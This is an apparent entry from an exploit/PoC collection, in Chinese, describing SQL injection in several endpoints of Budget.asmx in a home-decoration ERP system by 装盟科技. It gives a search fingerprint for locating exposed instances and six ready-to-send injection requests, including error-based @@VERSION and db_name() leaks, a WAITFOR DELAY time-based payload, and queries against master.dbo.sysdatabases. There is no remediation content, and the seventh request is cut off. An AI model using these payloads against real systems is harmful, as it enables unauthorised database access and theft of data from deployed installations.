# 装盟科技-家装ERP管理系统Budget.asmx多处存在SQL注入漏洞

- **系统**：装盟科技-家装ERP管理系统Budget.asmx多处　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="装盟科技-家装ERP管理系统"`
- **请求**：`POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
where=1=db_name()&intPageIndex=1&pageSize=20
**PoC-2**
GET /WEB_SERVICE/Budget.asmx/EditBudName?code=@@VERSION&name=string HTTP/1.1
Host:
**PoC-3**
GET /WEB_SERVICE/Budget.asmx/DyDes?code=';WAITFOR+DELAY+'0:0:5'--&info=string HTTP/1.1
Host:
**PoC-4**
GET /WEB_SERVICE/Budget.asmx/GetSelectTable?tableName=master.dbo.sysdatabases&strWhere=1=@@VERSION HTTP/1.1
Host:
**PoC-5**
GET /WEB_SERVICE/Budget.asmx/GetTableSet?tbName=master.dbo.sysdatabases&where=1=@@VERSION HTTP/1.1
Host:
**PoC-6**
GET /WEB_SERVICE/Budget.asmx/budRoomToSign?code=@@VERSION&no=string&bools=string HTTP/1.1
Host:
**PoC-7**
GET …（脚本共 1484 字，完整版见原文）
```
- **预期**：200　|　—